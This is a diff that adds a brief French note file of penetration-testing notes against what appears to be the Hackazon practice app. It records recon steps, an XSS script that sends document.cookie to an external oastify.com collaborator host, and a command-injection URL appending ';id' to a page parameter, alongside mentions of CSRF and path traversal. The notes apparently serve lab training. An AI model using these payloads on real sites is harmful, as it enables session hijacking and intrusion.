@@ -1,0 +1,27 @@
+création d'une alerte xss dans la faq via alert(1)
+
+///recon : https://hackazon.trackflaw.com/ ///
+
+https://hackazon.trackflaw.com//swagger.json :
+
+ffuf avec commons.txt
+
+
+
+
+
+
+<script> fetch('https://cfvont1lcy9qkyinwrvp2mxc43auymmb.oastify.com', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
+
+
+///Vuln : ////
+
+csrf : vol de cookie
+
+
+LFI / path traversal : récuperation
+
+injection de commande : https://hackazon.trackflaw.com/account/documents?page=terms.html;id
+
+
+///to do ///
